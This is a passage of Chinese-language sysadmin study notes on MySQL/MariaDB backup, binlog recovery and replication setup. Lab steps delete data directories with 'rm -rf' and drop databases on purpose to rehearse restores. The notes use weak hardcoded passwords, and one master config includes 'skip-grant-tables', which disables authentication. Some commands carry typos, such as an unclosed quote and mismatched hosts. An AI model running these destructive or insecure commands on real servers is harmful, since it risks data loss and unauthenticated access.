[root@centos8 ~]#rsync -av /var/lib/mysql/ 10.0.0.18:/var/lib/mysql/ 
[root@centos8 ~]#rsync -av/data/logbin/ 10.0.0.18:/data/   #10.0.0.18 须事先存在/data/目录


#在目标主机（10.0.0.18）执行
[root@centos8 ~]#dnf install mariadb-server
[root@centos8 ~]#chown -R mysql.mysql /var/lib/mysql/
[root@centos8 ~]#chown -R mysql.mysql /data/logbin/
[root@centos8 ~]#systemctl start mariadb
```

#### 35.8.3mysqldump备份还原

```
#1.命令格式:
mysqldump [OPTIONS] database [tables]   #支持指定数据库和指定多表的备份，但数据库本身定
义不备份
mysqldump [OPTIONS] -B DB1 [DB2 DB3...] #支持指定数据库备份，包含数据库本身定义也会备份
mysqldump [OPTIONS] -A [OPTIONS]        #备份所有数据库，包含数据库本身定义也会备份


#2.mysqldump常见通用选项
-A, --all-databases #备份所有数据库，含create database
-B, --databases db_name…  #指定备份的数据库，包括create database语句
-E, --events：#备份相关的所有event scheduler
-R, --routines：#备份所有存储过程和自定义函数
--triggers：#备份表相关触发器，默认启用,用--skip-triggers，不备份触发器
--default-character-set=utf8 #指定字符集
--master-data[=#]： #此选项须启用二进制日志
#1：所备份的数据之前加一条记录为CHANGE MASTER TO语句，非注释，不指定#，默认为1，适合于主从复
制多机使用
#2：记录为被注释的#CHANGE MASTER TO语句，适合于单机使用
#此选项会自动关闭--lock-tables功能，自动打开-x | --lock-all-tables功能（除非开启--
single-transaction）
-F, --flush-logs #备份前滚动日志，锁定表完成后，执行flush logs命令,生成新的二进制日志文
件，配合-A 或 -B 选项时，会导致刷新多次数据库。建议在同一时刻执行转储和日志刷新，可通过和--
single-transaction或-x，--master-data 一起使用实现，此时只刷新一次二进制日志
--compact #去掉注释，适合调试，节约备份占用的空间,生产不使用
-d, --no-data #只备份表结构,不备份数据,即只备份create table 
-t, --no-create-info #只备份数据,不备份表结构,即不备份create table 
-n,--no-create-db #不备份create database，可被-A或-B覆盖
--flush-privileges #备份mysql或相关时需要使用
-f, --force       #忽略SQL错误，继续执行
--hex-blob        #使用十六进制符号转储二进制列，当有包括BINARY， VARBINARY，
BLOB，BIT的数据类型的列时使用，避免乱码
-q, --quick     #不缓存查询，直接输出，加快备份速度


#4.mysqldump的MyISAM存储引擎相关的备份选项：
MyISAM不支持事务，只能支持温备；不支持热备，所以必须先锁定要备份的库，而后启动备份操作
-x,--lock-all-tables #加全局读锁，锁定所有库的所有表，同时加--single-transaction或--
lock-tables选项会关闭此选项功能，注意：数据量大时，可能会导致长时间无法并发访问数据库
-l,--lock-tables #对于需要备份的每个数据库，在启动备份之前分别锁定其所有表，默认为on,--
skip-lock-tables选项可禁用,对备份MyISAM的多个库,可能会造成数据不一致
#注：以上选项对InnoDB表一样生效，实现温备，但不推荐使用


#5.mysqldump的InnoDB存储引擎相关的备份选项：
 InnoDB 存储引擎支持事务,可以利用事务的相应的隔离级别,实现热备，也可以实现温备但不建议用
 --single-transaction(备份期间数据不变)
#此选项Innodb中推荐使用，不适用MyISAM，此选项会开始备份前，先执行START TRANSACTION指令开启
事务
#此选项通过在单个事务中转储所有表来创建一致的快照。 仅适用于存储在支持多版本控制的存储引擎中的表
（目前只有InnoDB可以）; 转储不保证与其他存储引擎保持一致。 在进行单事务转储时，要确保有效的转储
文件（正确的表内容和二进制日志位置），没有其他连接应该使用以下语句：ALTER TABLE，DROP 
TABLE，RENAME TABLE，TRUNCATE TABLE,此选项和--lock-tables（此选项隐含提交挂起的事务）选
项是相互排斥,备份大型表时，建议将--single-transaction选项和--quick结合一起使用


#6.案例
#备份所有数据库
[root@centos8 ~]# mysql -e 'show databases'
[root@centos8 ~]# mysqldump -A > /data/all.sql
[root@centos8 ~]# mysql < all.sql
```

##### 35.8.3.1生产环境实战备份策略

```
#1.InnoDB建议备份策略
mysqldump -uroot -p -A -F --single-transaction --master-data=2 --flush-privileges --default-character-set=utf8 --hex-blob > ${BACKUP}/fullbak_${BACKUP_TIME}.sql


#2.MyISAM建议备份策略
mysqldump -uroot -p -A -F -E -R -x --master-data=1 --flush-privileges --
triggers --default-character-set=utf8 --hex-blob
>${BACKUP}/fullbak_${BACKUP_TIME}.sql
```

##### 35.8.3.2备份特定数据库脚本

```
#特定数据库的备份脚本
#MariaDB10.3.17进行还原
#!/bin/bash
TIME=`date +%F_%H-%M-%S`
DIR=/backup
DB=hellodb
PASS=123456
SCRIPT=mysql_backup.sh

[ -d $DIR ] || mkdir $DIR
mysqldump -uroot -F --single-transaction --master-data=2 --default-character-set=utf8 -q -B $DB | gzip > ${DIR}/${DB}_${TIME}.sql.gz
[root@centos8 ~]#chmod +x $SCRIPT

#创建计划任务
[root@centos8 ~]#crontab -e
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/sbin:/root/bin
32 * * * * /data/logbin/mysql_backup.sh 

[root@centos8 ~]# ll /backup/
total 4
-rw-r--r-- 1 root root 2040 May 26 17:32 hellodb_2022-05-26_17-32-01.sql.gz
[root@centos8 backup]# gzip -d hellodb_2022-05-26_17-32-01.sql.gz
[root@centos8 ~]# cd /backup/
[root@centos8 backup]# ll
total 8
-rw-r--r-- 1 root root 8078 May 26 17:32 hellodb_2022-05-26_17-32-01.sql
#开始还原
[root@centos8 ~]# mysql
#先破坏
MariaDB [(none)]> drop database hellodb;
Query OK, 7 rows affected (0.046 sec)
MariaDB [(none)]> set sql_log_bin=0;
Query OK, 0 rows affected (0.000 sec)
#再还原
MariaDB [(none)]> source /backup/hellodb_2022-05-26_17-32-01.sql
MariaDB [hellodb]> show tables;
#还原成功！！！！
+-------------------+
| Tables_in_hellodb |
+-------------------+
| classes           |
| coc               |
| courses           |
| scores            |
| students          |
| teachers          |
| toc               |
+-------------------+
7 rows in set (0.000 sec)
MariaDB [hellodb]> set sql_log_bin=1 #一定要开启二进制日志
```

##### 35.8.3.3分库备份的实战脚本

```
#1.分库备份并压缩
[root@centos8 ~]#for db in `mysql -uroot -e 'show databases'|grep -Ev 
'^(Database|information_schema|performance_schema)$'`;do mysqldump -B $db | gzip 
> /backup/$db.sql.gz;done
[root@centos8 ~]#mysql -uroot -e 'show databases'|grep -Ev 
'^(Database|information_schema|performance_schema)$'|while read db;do mysqldump 
-B $db | gzip > /backup/$db.sql.gz;done
[root@centos8 ~]#mysql -uroot -e 'show databases'|grep -Ev 
'^(Database|information_schema|performance_schema)$' | sed -rn 's#
(.*)#mysqldump -B \1 | gzip > /backup/\1.sql.gz#p' |bash
[root@centos8 ~]#mysql -uroot -e 'show databases'|sed -rn 
'/^(Database|information_schema|performance_schema)$/!s#(.*)#mysqldump -B \1 | 
gzip > /backup/\1.sql.gz#p' |bash


#2.实战脚本
#即每一个数据库都对应一个sql备份文件
[root@centos8 ~]#cat backup_db.sh
#!/bin/bash
TIME=`date +%F_%H-%M-%S`
DIR=/backup
PASS=""

[ -d "$DIR" ] || mkdir $DIR
for DB in `mysql -uroot -p{$PASS} -e 'show databases' | grep -Ev "^Database|.*schema$"`;do
mysqldump -F --single-transaction --master-data=2 --default-character-set=utf8 -q -B $DB | gzip > ${DIR}/${DB}_${TIME}.sql.gz
done
```

![1653561850536](linuxSRE.assets/1653561850536.png)

##### 35.8.3.4二进制日志还原mysql最新状态

```
#开启二进制进行增量备份
#MariaDB10.3.17进行还原
[root@centos8 ~]# systemctl stop mariadb
[root@centos8 ~]# rm -rf /var/lib/mysql/*
[root@centos8 ~]# rm -rf /data/logbin/*
[root@centos8 ~]# systemctl start mariadb
[root@centos8 ~]# mysql < hellodb_innodb.sql
[root@centos8 ~]# mysqldump -uroot -p123456 -A -F --default-character-set=utf8  --single-transaction --master-data=2 |gzip > /opt/all_`date +%F`.sql.gz
[root@centos8 ~]#gzip -d /opt/all.sql.gz
[root@centos8 ~]#vim /opt/all.sql
-- CHANGE MASTER TO MASTER_LOG_FILE='binlog.000003', MASTER_LOG_POS=22150; #22150之前的二进制已经完全备份

#在完全备份做好以后向数据库插入2条记录做增量备份
MariaDB [hellodb]> insert teachers values(null,'xiaohong',20,'M');
MariaDB [hellodb]> insert teachers values(null,'xiaoming',20,'M');

[root@centos8 ~]# systemctl stop mariadb
[root@centos8 ~]# rm -rf /var/lib/mysql/* 继续删库做实验
[root@centos8 ~]# vim /opt/all.sq
-- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000002', MASTER_LOG_POS=10324; #0~10324完全备份的日志
[root@centos8 ~]# ll /data/logbin/
total 48
-rw-rw---- 1 mysql mysql 26624 May 26 12:02 mysql-bin.000001
-rw-rw---- 1 mysql mysql 10849 May 26 12:11 mysql-bin.000002
-rw-rw---- 1 mysql mysql    60 May 26 12:02 mysql-bin.index
[root@centos8 ~]# cd /data/logbin/
[root@centos8 logbin]# mysqlbinlog --start-position=10324 mysql-bin.000002 > /opt/binlog.sql #把增量日志导出来
[root@centos8 ~]# systemctl start mariadb
[root@centos8 logbin]# mysql
MariaDB [(none)]> select @@sql_log_bin;
+---------------+
| @@sql_log_bin |
+---------------+
|             1 |
+---------------+
1 row in set (0.000 sec)
MariaDB [(none)]> set sql_log_bin=0; #临时禁止二进制日志
[root@centos8 ~]# ll /opt/
total 484
-rw-r--r-- 1 root root 487688 May 26 12:03 all.sql
-rw-r--r-- 1 root root   2789 May 26 12:25 binlog.sql

#先还原完全备份
MariaDB [(none)]> source /opt/all.sql
MariaDB [mysql]> show databases;
+--------------------+
| Database           |
+--------------------+
| hellodb            |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.000 sec
#再还原增量备份
MariaDB [hellodb]> source /opt/binlog.sql
MariaDB [hellodb]> set sql_log_bin=1;
MariaDB [hellodb]> select *from teachers;
#彻底全部还原成功！！！！
+-----+---------------+-----+--------+
| TID | Name          | Age | Gender |
+-----+---------------+-----+--------+
|   1 | Song Jiang    |  45 | M      |
|   2 | Zhang Sanfeng |  94 | M      |
|   3 | Miejue Shitai |  77 | F      |
|   4 | Lin Chaoying  |  93 | F      |
|   5 | xiaohong      |  20 | M      |
|   6 | xiaoming      |  20 | M      |
+-----+---------------+-----+--------+
6 rows in set (0.000 sec)
```

##### 35.8.3.5恢复误删除的表

```
案例说明：每天2：30做完全备份，早上10：00误删除了表teachers，10：10才发现故障，现需要将数据库还原到10：10的状态，且恢复被删除的teachers表


#mysql8.0.17进行还原
#1.查看二进制日志是否开启
mysql> select @@log_bin;
+-----------+
| @@log_bin |
+-----------+
|         1 |
+-----------+
1 row in set (0.01 sec)
mysql> select @@binlog_format;
+-----------------+
| @@binlog_format |
+-----------------+
| ROW             |
+-----------------+
1 row in set (0.00 sec)

#2.数据库文件和二进制文件分开存放
root@centos8_1:~# vim /etc/my.cnf.d/mysql-server.cnf
log-bin=/data/logbin/mysql-bin
binlog_format=row #二进制格式默认行格式
root@centos8_1:~# mkdir /data/logbin/ -pv
mkdir: created directory '/data/logbin/'
root@centos8_1:~# chown mysql.mysql /data/logbin
root@centos8_1:~# systemctl restart mysqld
root@centos8_1:~# ll /data/logbin/
total 8
-rw-r----- 1 mysql mysql 155 May 26 19:27 mysql-bin.000001
-rw-r----- 1 mysql mysql  30 May 26 19:27 mysql-bin.index

#3.开始进行备份
root@centos8_1:~# mysqldump -uroot -A -F --single-transaction --master-data=2 --default-character-set=utf8  > /opt/all.sql
root@centos8_1:~# ll /opt/
total 988
-rw-r--r-- 1 root root 1010029 May 26 19:31 all.sq

#4.模拟2点半到10点的数据更新
mysql> insert teachers values(null,'xiaoqiang',30,'M');
mysql> insert teachers values(null,'wangcai',20,'M');

#5.10点钟误删除teachers表
mysql> drop table teachers;

#6.10点到10.10分其他表还在更新
mysql> insert students values(null,'alice',20,'M',1,1);
mysql> insert students values(null,'bob',20,'M',1,1);

#7.暂停数据库并进行恢复
root@centos8_1:~# systemctl stop mysqld
root@centos8_1:~# mysqlbinlog /data/logbin/mysql-bin.000002 > /opt/binlog.sql
#去除删表的行为
-i是忽略大小写
root@centos8_1:~# grep -i "drop table" /opt/binlog.sql 
DROP TABLE `teachers` /* generated by server */
root@centos8_1:~# sed -i.bak '/^DROP TABLE/d' /opt/binlog.sql #删除
root@centos8_1:~# systemctl start mysqld
root@centos8_1:~# mysql
mysql> set sql_log_bin=0; #关闭二进制日志，没有还原也会生成二进制
mysql> source /opt/all.sql;
mysql> source /opt/binlog.sql;
mysql> show tables;
teachers表已经还原！！
+-------------------+
| Tables_in_hellodb |
+-------------------+
| classes           |
| coc               |
| courses           |
| scores            |
| students          |
| teachers          |
| toc               |
+-------------------+
7 rows in set (0.00 sec)
```

#### 35.8.4xtrabackup备份还原

##### 35.8.4.1xtrabackup语法

```
#0.下载地址：https://www.percona.com/downloads/Percona-XtraBackup-LATEST/#
注意2.4版本才能备份mysql5.6,5.7，8.0版本只能备份mysql8.0


#1.xtrabackup工具备份和还原，需要三步实现
1. 备份：对数据库做完全或增量备份
2. 预准备： 还原前，先对备份的数据，整理至一个临时目录
3. 还原：将整理好的数据，复制回数据库目录中


#2.备份：
innobackupex [option] BACKUP-ROOT-DIR
选项说明：
--user：#该选项表示备份账号
--password：#该选项表示备份的密码
--host：#该选项表示备份数据库的地址
--databases：#该选项接受的参数为数据库名，如果要指定多个数据库，彼此间需要以空格隔开；
如："xtra_test dba_test"，同时，在指定某数据库时，也可以只指定其中的某张表。
如："mydatabase.mytable"。该选项对innodb引擎表无效，还是会备份所有innodb表
--defaults-file：#该选项指定从哪个文件读取MySQL配置，必须放在命令行第一个选项位置
--incremental：#该选项表示创建一个增量备份，需要指定--incremental-basedir
--incremental-basedir：#该选项指定为前一次全备份或增量备份的目录，与--incremental同时使用
--incremental-dir：#该选项表示还原时增量备份的目录
--include=name：#指定表名，格式：databasename.tablename


#3.Prepare预准备：
innobackupex --apply-log [option] BACKUP-DIR
选项说明：
--apply-log：#一般情况下,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚
未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据文件仍处理不一致状态。此选项作
用是通过回滚未提交的事务及同步已经提交的事务至数据文件使数据文件处于一致性状态
--use-memory：#和--apply-log选项一起使用，当prepare 备份时，做crash recovery分配的内存
大小，单位字节，也可1MB,1M,1G,1GB等，推荐1G
--export：#表示开启可导出单独的表之后再导入其他Mysql中
--redo-only：#此选项在prepare base full backup，往其中合并增量备份时候使用，但不包括对最
后一个增量备份的合并


#4.还原
innobackupex --copy-back [选项] BACKUP-DIR
innobackupex --move-back [选项] [--defaults-group=GROUP-NAME] BACKUP-DIR
选项说明：
--copy-back：#做数据恢复时将备份数据文件拷贝到MySQL服务器的datadir
--move-back：#这个选项与--copy-back相似，唯一的区别是它不拷贝文件，而是移动文件到目的地。这
个选项移除backup文件，用时候必须小心。使用场景：没有足够的磁盘空间同事保留数据文件和Backup副本
--force-non-empty-directories #指定该参数时候，使得innobackupex --copy-back或--moveback选项转移文件到非空目录，已存在的文件不会被覆盖。如果--copy-back和--move-back文件需要从
备份目录拷贝一个在datadir已经存在的文件，会报错失败


#5.还原注意事项
1. datadir 目录必须为空。除非指定innobackupex --force-non-empty-directorires选项指定，否则-
-copy-back选项不会覆盖
2. 在restore之前,必须shutdown MySQL实例，不能将一个运行中的实例restore到datadir目录中
3. 由于文件属性会被保留，大部分情况下需要在启动实例之前将文件的属主改为mysql，这些文件将
属于创建备份的用户, 执行chown -R mysql:mysql /data/mysql,以上需要在用户调用
innobackupex之前完成
```

##### 35.8.4.2xtrabackup完全备份还原

```
案例1：新版xtrabackup完全备份及还原mysql8.0
#源主机进行本机备份
#两个机器上都要安装xtrabackup
#1.把从官网上下的percona-xtrabackup-24-2.4.18-1.el8.x86_64.rpm包拉到linux里面
root@centos8_1:~# yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm

#2.在原主机做完全备份到/backup
root@centos8_1:~# mkdir /backup
root@centos8_1:~# xtrabackup -uroot --backup --target-dir=/backup/base
root@centos8_1:~# scp -r /backup/ 10.0.0.8:/

#3.进行目标主机的备份
[root@centos8 ~]# yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm
1）预准备：确保数据一致，提交完成的事务，回滚未完成的事务
[root@centos8 ~]# xtrabackup --prepare --target-dir=/backup/base
220526 23:45:53 completed OK!
2）复制到数据库目录
注意：数据库目录必须为空，MySQL服务不能启动
[root@centos8 ~]# systemctl stop mysqld
[root@centos8 ~]# rm -rf /var/lib/mysql/*
[root@centos8 ~]# xtrabackup --copy-back --target-dir=/backup/base
3）还原属性
[root@centos8 ~]# chown -R mysql:mysql /var/lib/mysql
4）启动服务
[root@centos8 ~]# systemctl start mysqld



案例2：旧版xtrabackup完全备份及还原
本案例基于CentOS 8 的 MySQL5.7 实现,也支持MySQL5.5和Mariadb5.5
1.安装xtrabackup包 #先安装MySQL5.7
[root@centos8 ~]#yum -y install percona-xtrabackup-24-2.4.20-1.el8.x86_64.rpm
2.在原主机做完全备份到/backup
[root@centos8 ~]#mkdir /backup
[root@centos8 ~]#xtrabackup -uroot -pmagedu --backup --target-dir=/backup/base
#目标主机无需创建/backup目录,直接复制目录本身
[root@centos8 ~]#scp -r /backup/   目标主机:/


3.在目标主机上还原
1）预准备：确保数据一致，提交完成的事务，回滚未完成的事务
[root@centos8 ~]#yum -y install percona-xtrabackup-24-2.4.20-1.el8.x86_64.rpm
[root@centos8 ~]#xtrabackup --prepare --target-dir=/backup/base
2）复制到数据库目录
注意：数据库目录必须为空，MySQL服务不能启动
[root@centos8 ~]#xtrabackup --copy-back --target-dir=/backup/base
3）还原属性
[root@centos8 ~]#chown -R mysql:mysql /data/mysql
4）启动服务
[root@centos8 ~]#systemctl start mysqld
```

##### 35.8.4.3xtrabackup完全及增量备份

```
#1.备份过程
#备份源主机
1）完全备份：
[root@centos8 ~]#yum -y install percona-xtrabackup-80-8.0.23-16.1.el8.x86_64.rpm
[root@centos8 ~]#mkdir /backup/
[root@centos8 ~]#xtrabackup -uroot --backup --target-dir=/backup/base
2）第一次修改数据
3）第一次增量备份
root@centos8_1:~# xtrabackup -uroot --backup --target-dir=/backup/inc1 --incremental-basedir=/backup/base
root@centos8_1:~# ll /backup/
total 8
drwxr-x--- 6 root root 4096 May 27 00:20 base
drwxr-x--- 6 root root 4096 May 27 00:24 inc1
4）第二次修改数据
5）第二次增量
root@centos8_1:~# xtrabackup -uroot --backup --target-dir=/backup/inc2 --incremental-basedir=/backup/inc1
root@centos8_1:~# ll /backup/
total 12
drwxr-x--- 6 root root 4096 May 27 00:20 base
drwxr-x--- 6 root root 4096 May 27 00:24 inc1
drwxr-x--- 6 root root 4096 May 27 00:27 inc2
root@centos8_1:~# scp -r /backup/ 10.0.0.8:/



#备份目标主机
[root@centos8 ~]# systemctl stop mysqld
[root@centos8 ~]# rm -rf /var/lib/mysql/*
还原过程
1）预准备完成备份，此选项--apply-log-only
[root@centos8 ~]# xtrabackup --prepare --apply-log-only --target-dir=/backup/base
2）合并第1次增量备份到完全备份
[root@centos8 ~]# xtrabackup --prepare --apply-log-only --target-dir=/backup/base --incremental-dir=/backup/inc1
3）合并第2次增量备份到完全备份：最后一次还原不需要加选项--apply-log-only
[root@centos8 ~]# xtrabackup --prepare --target-dir=/backup/base --incremental-dir=/backup/inc2
4）复制到数据库目录，注意数据库目录必须为空，MySQL服务不能启动
[root@centos8 ~]# xtrabackup --copy-back --target-dir=/backup/base
[root@centos8 ~]# chown -R mysql:mysql /var/lib/mysql
6）启动服务：
[root@centos8 ~]# systemctl start mysqld
```

![1653616824807](linuxSRE.assets/1653616824807.png)

### 35.9 MySQL集群

#### 35.9.1主从复制原理

![1653619477027](linuxSRE.assets/1653619477027.png)

#### 38.9.2主从复制配置

```
#主节点：10.0.0.8
#基于mysql8.0
#注意这只是一个单向复制：即主数据库可以实时同步数据到从数据库，但是从数据库若修改数据，主数据库不会同步

#0.先把之前数据库里面的文件进行完全备份
[root@centos8 ~]# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all.sql

#1.确定开启二进制日志
mysql> select @@log_bin;
+-----------+
| @@log_bin |
+-----------+
|         1 |
+-----------+
1 row in set (0.01 sec)

#2.为当前节点设置一个全局惟一的ID号
[root@centos8 ~]# vim /etc/my.cnf.d/mysql-server.cnf
[mysqld]
server_id=8
log-bin=/data/logbin/mysql-bin
[root@centos8 ~]# mkdir /data/logbin/ -pv
[root@centos8 ~]# chown mysql.mysql /data/logbin
[root@centos8 ~]# systemctl restart mysqld
[root@centos8 ~]# ll /data/logbin/
total 8
-rw-r----- 1 mysql mysql 155 May 27 11:20 mysql-bin.000001
-rw-r----- 1 mysql mysql  30 May 27 11:20 mysql-bin.index
[root@centos8 ~]# mysql
mysql> select @@server_id;
#server_id已经修改成功
+-------------+
| @@server_id |
+-------------+
|           8 |
+-------------+
1 row in set (0.00 sec)

#3.查看从二进制日志的文件和位置开始进行复制
mysql> show master logs;
#从155往后发生的所有日志都要记录到从节点
+------------------+-----------+-----------+
| Log_name         | File_size | Encrypted |
+------------------+-----------+-----------+
| mysql-bin.000001 |       155 | No        |
+------------------+-----------+-----------+
1 row in set (0.00 sec)

#4.创建有复制权限的用户账号
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';
mysql8.0之前的版本一条命令搞定
GRANT REPLICATION SLAVE  ON *.* TO 'repluser'@'HOST' IDENTIFIED BY 'replpass';

#5.把完全备份传到目标服务器上
[root@centos8 ~]# scp /opt/all.sql 10.0.0.18:/data


#从节点：10.0.0.18
#1.启动中继日志
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server_id=18
read_only
root@centos8_1:~# systemctl restart mysqld

#2.修改完全备份脚本
使用有复制权限的用户账号连接至主服务器，并启动复制线程
root@centos8_1:~# vim /data/all.sql
把下面四行加在CHANGE MASTER TO这行下面，保存并退出
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,

#3.先禁用二进制日志
mysql> set sql_log_bin=0;
mysql> source /data/all.sql #这个脚本等于做了两件事，第一件事完全备份还原，第二件事自动执行了CHANGE MASTER TO

#4.真正开启线程数
mysql> start slave;
mysql> show slave status\G
#看到以下信息表示成功
Slave_IO_Running: Yes
Slave_SQL_Running: Yes
Seconds_Behind_Master: 0

mysql> show processlist;
#10.0.0.18机器出现Connect：Waiting for master to send event和Query：Slave has read all relay log; waiting for more updates则表示开启成功
#10.0.0.8机器出现Binlog Dump也表示成功了！！


#故障排错
#单向复制：即主数据库可以实时同步数据到从数据库，但是从数据库若修改数据，主数据库不会同步，若是从数据库用户不小心修改一条数据，而此时主数据库又插入一条数据，则会出现同步错误

#从数据库
#1.先停止线程
mysql> stop slave;
mysql> show slave status\G
Slave_IO_Running: No
Slave_SQL_Running: No

#2.先跳过你发生的错误
mysql> SET GLOBAL sql_slave_skip_counter = 1
mysql> start slave;
mysql> show slave status\G
Slave_IO_Running: Yes
Slave_SQL_Running: Yes

#3.或者修改系统变量
#系统变量，指定跳过复制事件的个数
SET GLOBAL sql_slave_skip_counter = N
#服务器选项，只读系统变量，指定跳过事件的ID
[mysqld]
slave_skip_errors=1007|ALL

#4.然后手动修改你发生错误
```

#### 35.9.3实现级联复制

```/
#在10.0.0.8充当master
#在10.0.0.18充当级联slave
#在10.0.0.28充当slave


#在master实现
#1.先把之前数据库里面的文件进行完全备份
[root@centos8 ~]# mysqldump -uroot -A -F --single-transaction --master-data=1 --default-character-set=utf8  > /opt/all.sql

#2.确定开启二进制日志
mysql> select @@log_bin;
+-----------+
| @@log_bin |
+-----------+
|         1 |
+-----------+
1 row in set (0.01 sec)

#3.为当前节点设置一个全局惟一的ID号
[root@centos8 ~]# vim /etc/my.cnf.d/mysql-server.cnf
[mysqld]
server_id=8
log-bin=/data/logbin/mysql-bin
[root@centos8 ~]# mkdir /data/logbin/ -pv
[root@centos8 ~]# chown mysql.mysql /data/logbin
[root@centos8 ~]# systemctl restart mysqld

#4.创建有复制权限的用户账号
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';

#5.把完全备份传到目标服务器上
[root@centos8 ~]# scp /opt/all.sql 10.0.0.18:/data
[root@centos8 ~]# scp /opt/all.sql 10.0.0.88:/data



#在中间级联slave实现
#1.修改配置文件
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server_id=18
read_only
log_slave_updates  #级联复制中间节点的必选项
root@centos8_1:~# systemctl restart mysqld

#2.修改完全备份脚本
使用有复制权限的用户账号连接至主服务器，并启动复制线程
root@centos8_1:~# vim /data/all.sql
把下面四行加在CHANGE MASTER TO这行下面，保存并退出
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,

#3.先禁用二进制日志
mysql> set sql_log_bin=0;
mysql> source /data/all.sql #这个脚本等于做了两件事，第一件事完全备份还原，第二件事自动执行了CHANGE MASTER TO
mysql> show master logs;  #记录二进制位置，给第三个节点使用  
+---------------+-----------+-----------+
| Log_name      | File_size | Encrypted |
+---------------+-----------+-----------+
| binlog.000001 |     12887 | No        |
+---------------+-----------+-----------+
mysql> set sql_log_bin=0;
#4.真正开启线程数
mysql> start slave;



#在第三个节点slave上实现
#1.修改配置文件
[root@centos8_clone1 ~]# yum -y install mysql-server
[root@centos8_clone1 ~]# vim /etc/my.cnf
[mysqld]
server-id=28
read-only
[root@centos8_clone1 ~]# systemctl restart mysqld

#2.使用有复制权限的用户账号连接至主服务器，并启动复制线程
[root@centos8_clone1 ~]# vim /opt/all.sql
MASTER_HOST='10.0.0.18', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='binlog.000002', MASTER_LOG_POS=341;

#3.开启线程
[root@centos8_clone1 ~]# mysql < /data/all.sql
[root@centos8_clone1 ~]# mysql -e 'start slave;'
```

#### 35.9.4半同步复制

```
#半同步：只要有一个成功了就行，
#在10.0.0.8充当master
#在10.0.0.18充当半同步slave
#在10.0.0.38充当半同步slave
#如果在此期间数据同步出现主服务器更新数据，其余的另外的两个从服务器其中一个不能自动同步数据，但主服务器上又看到连接状态已经连上去了，解决办法是先从master服务器上完全备份二进制数据，然后远程同步到从服务器，stop slave后，mysql < 二进制完全备份，start slave之后，则能解决问题！

#在master实现：10.0.0.8
#1.安装插件
[root@centos8 ~]# yum -y install mysql-server
[root@centos8 ~]# mysql
mysql> INSTALL PLUGIN rpl_semi_sync_master SONAME 'semisync_master.so';
mysql> mysql> show plugins;

#2.配置文件里配置
[root@centos8 ~]# vim /etc/my.cnf
[mysqld]
skip-grant-tables
skip-networking
server-id=8
log-bin
rpl_semi_sync_master_enabled=ON  #开启半同步功能
rpl_semi_sync_master_timeout=3000  #设置3s内无法同步，也将返回成功信息给客户端
[root@centos8 ~]# systemctl restart mysqld

#3.查看配置是否成功
[root@centos8 ~]# mysql
mysql> SHOW GLOBAL VARIABLES LIKE '%semi%';
看到ON就表示成功！！！
+-------------------------------------------+------------+
| Variable_name                             | Value      |
+-------------------------------------------+------------+
| rpl_semi_sync_master_enabled              | ON         |
| rpl_semi_sync_master_timeout              | 3000       |
| rpl_semi_sync_master_trace_level          | 32         |
| rpl_semi_sync_master_wait_for_slave_count | 1          |
| rpl_semi_sync_master_wait_no_slave        | ON         |
| rpl_semi_sync_master_wait_point           | AFTER_SYNC |
+-------------------------------------------+------------+
6 rows in set (0.00 sec)
mysql> SHOW GLOBAL STATUS LIKE '%semi%';
+--------------------------------------------+-------+
| Variable_name                              | Value |
+--------------------------------------------+-------+
| Rpl_semi_sync_master_clients               | 0     |
| Rpl_semi_sync_master_net_avg_wait_time     | 0     |
| Rpl_semi_sync_master_net_wait_time         | 0     |
| Rpl_semi_sync_master_net_waits             | 0     |
| Rpl_semi_sync_master_no_times              | 0     |
| Rpl_semi_sync_master_no_tx                 | 0     |
| Rpl_semi_sync_master_status                | ON    |
| Rpl_semi_sync_master_timefunc_failures     | 0     |
| Rpl_semi_sync_master_tx_avg_wait_time      | 0     |
| Rpl_semi_sync_master_tx_wait_time          | 0     |
| Rpl_semi_sync_master_tx_waits              | 0     |
| Rpl_semi_sync_master_wait_pos_backtraverse | 0     |
| Rpl_semi_sync_master_wait_sessions         | 0     |
| Rpl_semi_sync_master_yes_tx                | 0     |
+--------------------------------------------+-------+
14 rows in set (0.00 sec)
mysql> show master logs; #记下来留着备份
+--------------------+-----------+-----------+
| Log_name           | File_size | Encrypted |
+--------------------+-----------+-----------+
| centos8-bin.000001 |       155 | No        |
+--------------------+-----------+-----------+
1 row in set (0.00 sec)

#4.进行授权
mysql> create user repluser@'10.0.0.%' identified by '123456';
mysql> grant replication slave on *.* to repluser@'10.0.0.%';



#从服务器配置 10.0.0.18
#1.安装插件
root@centos8_1:~# yum -y install mysql-server
root@centos8_1:~# mysql
mysql> INSTALL PLUGIN rpl_semi_sync_slave SONAME 'semisync_slave.so';

#2.配置文件里配置
root@centos8_1:~# vim /etc/my.cnf
[mysqld]
server-id=18
rpl_semi_sync_slave_enabled=ON
[root@centos8 ~]# systemctl restart mysqld

#3.查看配置是否成功
[root@centos8 ~]# mysql
mysql> SHOW GLOBAL VARIABLES LIKE '%semi%';
看到ON就表示成功！！！


#4.与主服务进行关联
CHANGE MASTER TO
MASTER_HOST='10.0.0.8', 
MASTER_USER='repluser', 
MASTER_PASSWORD='123456',
MASTER_PORT=3306,
MASTER_LOG_FILE='centos8-bin.000005, MASTER_LOG_POS=155;

#5.开启从节点线程
mysql> start slave;
mysql> SHOW GLOBAL STATUS LIKE '%semi%';
+----------------------------+-------+
| Variable_name              | Value |
+----------------------------+-------+
| Rpl_semi_sync_slave_status | ON    |
